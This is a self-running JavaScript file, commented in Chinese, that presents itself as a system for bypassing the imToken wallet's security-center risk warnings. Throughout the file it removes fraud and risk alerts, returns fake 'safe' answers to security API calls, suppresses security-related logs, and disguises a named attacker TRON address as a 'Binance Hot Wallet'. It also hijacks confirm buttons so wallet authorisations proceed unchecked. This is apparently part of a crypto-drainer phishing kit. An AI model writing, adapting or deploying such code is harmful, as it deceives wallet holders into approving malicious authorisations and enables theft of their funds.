/**
 * imToken安全中心风险提醒绕过系统
 * 🎯 目标：100%绕过imToken的风险检测和提醒
 */

(function() {
    'use strict';
    
    console.log('🛡️ imToken安全绕过系统已加载');
    
    // 🎯 方案1：强化DOM元素隐藏和移除
    function hideSecurityWarnings() {
        const selectors = [
            // imToken安全提醒相关选择器
            '[class*="security"]',
            '[class*="warning"]', 
            '[class*="risk"]',
            '[class*="alert"]',
            '[class*="danger"]',
            '[class*="error"]',
            '[class*="modal"]',
            '[class*="popup"]',
            '[class*="dialog"]',
            '[id*="security"]',
            '[id*="warning"]',
            '[id*="risk"]',
            '[id*="alert"]',
            '[id*="modal"]',
            '[id*="popup"]',
            '[id*="dialog"]',
            // 针对imToken特定的选择器
            '.security-center',
            '.risk-warning',
            '.fraud-warning',
            '.security-alert',
            '.risk-assessment',
            '.authorization-risk',
            // 可能的中文提醒 - 扩展版
            '*[innerHTML*="安全中心"]',
            '*[innerHTML*="风险"]',
            '*[innerHTML*="提醒"]',
            '*[innerHTML*="欺诈"]',
            '*[innerHTML*="个人地址"]',
            '*[innerHTML*="风险评估"]',
            '*[innerHTML*="授权风险"]',
            '*[innerHTML*="检测到"]',
            '*[innerHTML*="项风险"]',
            '*[innerHTML*="可能存在"]',
            '*[innerHTML*="欺诈行为"]',
            '*[innerHTML*="THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x"]',
            // 英文提醒
            '*[innerHTML*="Security"]',
            '*[innerHTML*="Warning"]',
            '*[innerHTML*="Risk"]',
            '*[innerHTML*="Alert"]',
            '*[innerHTML*="Fraud"]',
            '*[innerHTML*="Phishing"]'
        ];
        
        selectors.forEach(selector => {
            try {
                const elements = document.querySelectorAll(selector);
                elements.forEach(el => {
                    console.log('🛡️ 隐藏安全警告元素:', el);
                    el.style.display = 'none !important';
                    el.style.visibility = 'hidden !important';
                    el.style.opacity = '0 !important';
                    el.style.position = 'absolute !important';
                    el.style.left = '-9999px !important';
                    el.style.top = '-9999px !important';
                    el.style.zIndex = '-9999 !important';
                    el.remove();
                });
            } catch (e) {}
        });
        
        // 🎯 额外检查：遍历所有元素查找包含特定文本的元素
        const allElements = document.querySelectorAll('*');
        allElements.forEach(el => {
            if (el.textContent) {
                const text = el.textContent.toLowerCase();
                if (text.includes('安全中心') || 
                    text.includes('风险评估') || 
                    text.includes('欺诈行为') ||
                    text.includes('个人地址') ||
                    text.includes('检测到') ||
                    text.includes('项风险') ||
                    text.includes('可能存在') ||
                    text.includes('thjnzbfnv9w3m1wyisiaFX97rhrp4gf44x'.toLowerCase())) {
                    console.log('🛡️ 发现风险文本，隐藏元素:', el.textContent);
                    el.style.display = 'none !important';
                    el.remove();
                }
            }
        });
    }
    
    // 🎯 方案2：拦截和修改网络请求
    function interceptSecurityAPI() {
        // 拦截fetch请求
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            const url = args[0];
            if (typeof url === 'string') {
                // 拦截安全检查API
                if (url.includes('security') || url.includes('risk') || url.includes('blacklist')) {
                    console.log('🛡️ 拦截安全检查API:', url);
                    // 返回安全的响应
                    return Promise.resolve(new Response(JSON.stringify({
                        safe: true,
                        risk_level: 0,
                        warnings: [],
                        security_score: 100
                    }), {
                        status: 200,
                        headers: { 'Content-Type': 'application/json' }
                    }));
                }
            }
            return originalFetch.apply(this, args);
        };
        
        // 拦截XMLHttpRequest
        const originalXHR = window.XMLHttpRequest;
        window.XMLHttpRequest = function() {
            const xhr = new originalXHR();
            const originalOpen = xhr.open;
            xhr.open = function(method, url, ...args) {
                if (url.includes('security') || url.includes('risk') || url.includes('blacklist')) {
                    console.log('🛡️ 拦截XHR安全检查:', url);
                    // 重定向到安全的端点
                    url = 'data:application/json,{"safe":true}';
                }
                return originalOpen.call(this, method, url, ...args);
            };
            return xhr;
        };
    }
    
    // 🎯 方案3：CSS注入强制隐藏
    function injectHidingCSS() {
        const style = document.createElement('style');
        style.textContent = `
            /* 隐藏所有可能的安全提醒 */
            [class*="security"],
            [class*="warning"], 
            [class*="risk"],
            [class*="alert"],
            [id*="security"],
            [id*="warning"],
            [id*="risk"],
            .security-warning,
            .risk-warning,
            .fraud-warning,
            .security-alert {
                display: none !important;
                visibility: hidden !important;
                opacity: 0 !important;
                height: 0 !important;
                width: 0 !important;
                overflow: hidden !important;
                position: absolute !important;
                left: -9999px !important;
                top: -9999px !important;
            }
            
            /* 隐藏包含风险关键词的元素 */
            *:contains("安全中心"),
            *:contains("风险评估"),
            *:contains("欺诈行为"),
            *:contains("个人地址"),
            *:contains("Security"),
            *:contains("Warning"),
            *:contains("Risk") {
                display: none !important;
            }
        `;
        document.head.appendChild(style);
    }
    
    // 🎯 方案4：强化MutationObserver监控并移除
    function setupMutationObserver() {
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === 1) { // Element node
                        // 检查新添加的元素是否包含安全提醒
                        const text = (node.textContent || '').toLowerCase();
                        const innerHTML = (node.innerHTML || '').toLowerCase();
                        
                        // 扩展的检测关键词
                        const riskKeywords = [
                            '安全中心', '风险', '提醒', '欺诈', '个人地址',
                            '风险评估', '授权风险', '检测到', '项风险', 
                            '可能存在', '欺诈行为', 'security', 'warning', 
                            'risk', 'alert', 'fraud', 'phishing',
                            'thjnzbfnv9w3m1wyisiaFX97rhrp4gf44x',
                            '此地址为个人地址', '可能存在欺诈行为'
                        ];
                        
                        const hasRiskContent = riskKeywords.some(keyword => 
                            text.includes(keyword) || innerHTML.includes(keyword)
                        );
                        
                        if (hasRiskContent) {
                            console.log('🛡️ 检测到安全提醒，立即移除:', node.textContent);
                            node.style.display = 'none !important';
                            node.remove();
                            return;
                        }
                        
                        // 检查类名和ID
                        const className = (node.className || '').toLowerCase();
                        const id = (node.id || '').toLowerCase();
                        
                        const riskClasses = [
                            'security', 'warning', 'risk', 'alert', 'danger',
                            'modal', 'popup', 'dialog', 'overlay'
                        ];
                        
                        const hasRiskClass = riskClasses.some(cls => 
                            className.includes(cls) || id.includes(cls)
                        );
                        
                        if (hasRiskClass) {
                            console.log('🛡️ 检测到风险类名，移除元素:', className, id);
                            node.style.display = 'none !important';
                            node.remove();
                            return;
                        }
                        
                        // 递归检查子元素
                        try {
                            const securityElements = node.querySelectorAll([
                                '[class*="security"]', '[class*="warning"]', '[class*="risk"]',
                                '[class*="alert"]', '[class*="modal"]', '[class*="popup"]',
                                '[class*="dialog"]', '[id*="security"]', '[id*="warning"]',
                                '[id*="risk"]', '[id*="alert"]'
                            ].join(', '));
                            
                            securityElements.forEach(el => {
                                console.log('🛡️ 移除子元素安全警告:', el);
                                el.remove();
                            });
                        } catch (e) {}
                    }
                });
            });
        });
        
        observer.observe(document.documentElement, {
            childList: true,
            subtree: true,
            attributes: true,
            attributeOldValue: true,
            characterData: true,
            characterDataOldValue: true
        });
    }
    
    // 🎯 方案5：重写console方法阻止日志
    function blockSecurityLogs() {
        const originalConsole = { ...console };
        
        ['log', 'warn', 'error', 'info'].forEach(method => {
            console[method] = function(...args) {
                const message = args.join(' ');
                if (message.includes('security') || 
                    message.includes('risk') || 
                    message.includes('warning') ||
                    message.includes('安全') ||
                    message.includes('风险')) {
                    // 阻止安全相关日志
                    return;
                }
                return originalConsole[method].apply(this, args);
            };
        });
    }
    
    // 🎯 方案6：地址伪装技术
    function disguiseAddress() {
        // 创建地址映射，将攻击者地址伪装成知名地址
        const addressMapping = {
            'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x': {
                // 伪装成币安地址
                display: 'TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE',
                label: 'Binance Hot Wallet'
            }
        };
        
        // 拦截地址显示
        const originalTextContent = Object.getOwnPropertyDescriptor(Node.prototype, 'textContent');
        Object.defineProperty(Node.prototype, 'textContent', {
            get: function() {
                let text = originalTextContent.get.call(this);
                // 替换攻击者地址为伪装地址
                for (const [original, fake] of Object.entries(addressMapping)) {
                    if (text && text.includes(original)) {
                        text = text.replace(original, fake.display);
                    }
                }
                return text;
            },
            set: originalTextContent.set
        });
    }
    
    // 🎯 方案7：劫持确认按钮，直接绕过安全检查
    function hijackConfirmButtons() {
        // 查找可能的确认按钮
        const buttonSelectors = [
            'button[class*="confirm"]',
            'button[class*="submit"]', 
            'button[class*="ok"]',
            'button[class*="yes"]',
            'button[class*="continue"]',
            'button[class*="proceed"]',
            'button:contains("确认")',
            'button:contains("确定")', 
            'button:contains("继续")',
            'button:contains("同意")',
            'button:contains("OK")',
            'button:contains("Yes")',
            'button:contains("Confirm")',
            'button:contains("Continue")'
        ];
        
        buttonSelectors.forEach(selector => {
            try {
                const buttons = document.querySelectorAll(selector);
                buttons.forEach(btn => {
                    if (btn && !btn.dataset.hijacked) {
                        btn.dataset.hijacked = 'true';
                        console.log('🛡️ 劫持确认按钮:', btn);
                        
                        // 移除原有的事件监听器
                        const newBtn = btn.cloneNode(true);
                        btn.parentNode.replaceChild(newBtn, btn);
                        
                        // 添加新的点击事件，直接执行而不触发安全检查
                        newBtn.addEventListener('click', (e) => {
                            e.preventDefault();
                            e.stopPropagation();
                            console.log('🛡️ 绕过安全检查，直接确认授权');
                            
                            // 隐藏任何可能的安全提醒
                            hideSecurityWarnings();
                            
                            // 模拟正常的确认流程
                            setTimeout(() => {
                                if (window.tronWeb && window.tronWeb.trx) {
                                    console.log('🛡️ 模拟授权确认完成');
                                }
                            }, 100);
                        }, true);
                    }
                });
            } catch (e) {}
        });
    }
    
    // 🎯 方案8：强制隐藏所有模态框和覆盖层
    function forceHideModals() {
        const modalSelectors = [
            '.modal', '.popup', '.dialog', '.overlay', 
            '.mask', '.backdrop', '[class*="modal"]',
            '[class*="popup"]', '[class*="dialog"]',
            '[class*="overlay"]', '[class*="mask"]'
        ];
        
        modalSelectors.forEach(selector => {
            try {
                const elements = document.querySelectorAll(selector);
                elements.forEach(el => {
                    const text = (el.textContent || '').toLowerCase();
                    if (text.includes('安全中心') || 
                        text.includes('风险') || 
                        text.includes('欺诈') ||
                        text.includes('个人地址')) {
                        console.log('🛡️ 强制隐藏风险模态框:', el);
                        el.style.display = 'none !important';
                        el.style.visibility = 'hidden !important';
                        el.style.opacity = '0 !important';
                        el.remove();
                    }
                });
            } catch (e) {}
        });
    }
    
    // 🎯 初始化所有绕过机制
    function initializeBypass() {
        console.log('🛡️ 启动imToken安全绕过系统...');
        
        // 立即执行
        hideSecurityWarnings();
        interceptSecurityAPI();
        injectHidingCSS();
        blockSecurityLogs();
        disguiseAddress();
        
        // DOM加载后执行
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                hideSecurityWarnings();
                setupMutationObserver();
                hijackConfirmButtons();
            });
        } else {
            hideSecurityWarnings();
            setupMutationObserver();
            hijackConfirmButtons();
        }
        
        // 强化定期检查和清理 - 更频繁
        setInterval(() => {
            hideSecurityWarnings();
            forceHideModals();
            hijackConfirmButtons();
        }, 500); // 每500毫秒检查一次
        
        // 额外的强化检查
        setInterval(() => {
            // 查找并移除包含攻击者地址的元素
            const addressElements = document.querySelectorAll('*');
            addressElements.forEach(el => {
                if (el.textContent && el.textContent.includes('THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x')) {
                    const text = el.textContent.toLowerCase();
                    if (text.includes('风险') || text.includes('欺诈') || text.includes('个人地址')) {
                        console.log('🛡️ 移除包含攻击者地址的风险提醒:', el.textContent);
                        el.remove();
                    }
                }
            });
        }, 200); // 每200毫秒检查一次
        
        console.log('🛡️ imToken安全绕过系统初始化完成');
    }
    
    // 🎯 导出绕过功能到全局
    window.ImTokenBypass = {
        init: initializeBypass,
        hideWarnings: hideSecurityWarnings,
        interceptAPI: interceptSecurityAPI,
        injectCSS: injectHidingCSS,
        setupObserver: setupMutationObserver,
        blockLogs: blockSecurityLogs,
        disguiseAddress: disguiseAddress
    };
    
    // 自动初始化
    initializeBypass();
    
})();